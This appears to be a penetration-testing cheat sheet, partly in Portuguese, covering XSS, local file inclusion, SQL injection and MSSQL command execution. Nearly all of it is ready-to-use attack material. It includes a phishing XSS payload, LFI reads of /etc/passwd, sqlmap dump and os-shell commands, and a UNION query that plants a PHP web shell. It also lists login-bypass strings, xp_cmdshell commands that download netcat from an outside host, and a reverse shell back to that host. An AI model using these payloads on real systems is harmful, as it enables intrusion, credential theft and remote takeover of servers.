### XSS

Alert em campo de texto:

    </textarea><script>alert('XSS');</script>

Alert simples:

    <script>alert('XSS');</script>

Phishing no alert:

    </textarea><script>alert('Atenção! Sua senha está prestes a expirar, portanto é obrigatória a renovação de senha para evitar problemas com a sua conta. Acesse http://sitemalicioso.net e renove agora mesmo sua senha!');</script>

### Local File Inclusion (LFI)

```
http://example.com/page=../../../../../../etc/passwd
```



### Bypassing php-execution

So if you have an LFI you can easily read `.txt`-files but not `.php` files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter.

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run:

```
base64 -d savefile.php
```

## SQL INJECTION

sqlmap crawl
```
sqlmap -u http://10.10.10.10 --crawl=1
```

sqlmap dump database
```
sqlmap -u http://10.10.10.10 --dbms=mysql --dump
```

sqlmap shell
```
sqlmap -u http://10.10.10.10 --dbms=mysql --os-shell
```

Upload php command injection file
```
union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Load file
```
union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
```

Bypasses
```
' or 1=1 LIMIT 1 --
' or 1=1 LIMIT 1 -- -
' or 1=1 LIMIT 1#
'or 1#
' or 1=1 --
' or 1=1 -- -
' or '1'='1'#
' or 1=1--
' or true#
' or ''=''#
' or id='1'#
' or true limit 1#
' or true limit 3,1#
' OR 1=1 -- //
0 order by 5
0 union select 1,2,3
0 union select 1,3,database()
0 union select 1,user(),database()
0 union select 1,version(),database()
0 union select 1,2,concat(user(),":",version(),":",database())
0 union select 1,2,schema_name from information_schema.schemata
0 union select 1,2,table_name from information_schema.columns
0 union select 1,table_schema,table_name from information_schema.columns
0 union select 1,table_name,column_name from information_schema.columns where table_schema="tarefa02"
0 union select 1,2,flag from flag
```

Execução de comando:

```
sudo mysql -uroot -p123456 -e '\! /bin/sh'
```
## Blind

- https://medium.com/@vikramroot/exploiting-time-based-sql-injections-data-exfiltration-791aa7f0ae87
- https://github.com/nvanheuverzwijn/curl-blind-sql-injection/blob/master/README.md
- https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8


mssqlclient.py

```shell
mssqlclient.py dominio/usuário@192.168.X.X -hashes ":ushduashduhuhu32423u4husdu23" -windows-auth
```

```shell
EXECUTE AS LOGIN = 'sa';
EXEC ('sp_configure "show advanced options", 1; reconfigure') 
EXEC ('sp_configure "xp_cmdshell", 1; reconfigure') 
EXEC ('xp_cmdshell "hostname&&whoami"') 
EXEC ('xp_cmdshell "powershell.exe -e encodedHere"') 

EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "hostname&&whoami";') AT [alvo02];

EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "cmd /c sc query spooler";') AT [alvo02];

EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "powershell wget http://192.168.X.X/nc64.exe -o c:\windows\tasks\nc.exe";') AT [alvo02];

EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "cmd /c c:\windows\tasks\nc.exe 192.168.X.X 443 -e cmd.exe";') AT [alvo02];
```